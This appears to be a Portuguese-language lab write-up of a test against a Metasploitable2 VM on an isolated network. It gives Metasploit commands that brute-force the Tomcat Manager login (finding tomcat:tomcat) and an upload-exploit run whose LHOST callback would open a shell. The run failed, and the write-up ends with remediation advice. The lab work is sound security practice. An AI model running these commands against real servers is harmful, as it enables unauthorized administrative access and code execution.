# Writeup: Tomcat Manager - Credencial Fraca via Força Bruta - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: Metasploitable2 (VM VirtualBox)
- Rede: Internal Network isolada (192.168.56.0/24)

## 1. Reconhecimento
Identificado na varredura inicial com Nmap: Apache Tomcat/Coyote
rodando na porta 8180/tcp.

## 2. Ataque de força bruta
Uso do módulo auxiliar do Metasploit Framework contra o painel
de administração (Tomcat Manager):

    use auxiliary/scanner/http/tomcat_mgr_login
    set RHOSTS 192.168.56.10
    set RPORT 8180
    run

Resultado: credencial válida encontrada.

    [+] 192.168.56.10:8180 - Login Successful: tomcat:tomcat

## 3. Tentativa de exploração pós-autenticação
Com a credencial válida, foi utilizado o módulo de exploit para
upload de payload malicioso via manager:

    use exploit/multi/http/tomcat_mgr_upload
    set RHOSTS 192.168.56.10
    set RPORT 8180
    set LHOST 192.168.56.11
    set HttpUsername tomcat
    set HttpPassword tomcat
    exploit

Resultado: falha por incompatibilidade do módulo com a resposta
HTML da versão antiga do Tomcat testada (erro
`NoMethodError: undefined method 'unpack' for nil`). A execução
de código remoto não foi demonstrada nesta sessão, mas a
vulnerabilidade de credencial fraca já é, por si só, uma falha
crítica reportável — o acesso administrativo obtido permitiria
deploy manual de aplicações maliciosas através da interface web
do manager, mesmo sem o módulo automatizado.

## Conclusão
Credencial padrão/fraca (tomcat:tomcat) no painel de
administração do Tomcat permite acesso administrativo completo.
Como correção: nunca usar credenciais padrão em produção, impor
política de senha forte, e restringir acesso ao Tomcat Manager
por IP/firewall.
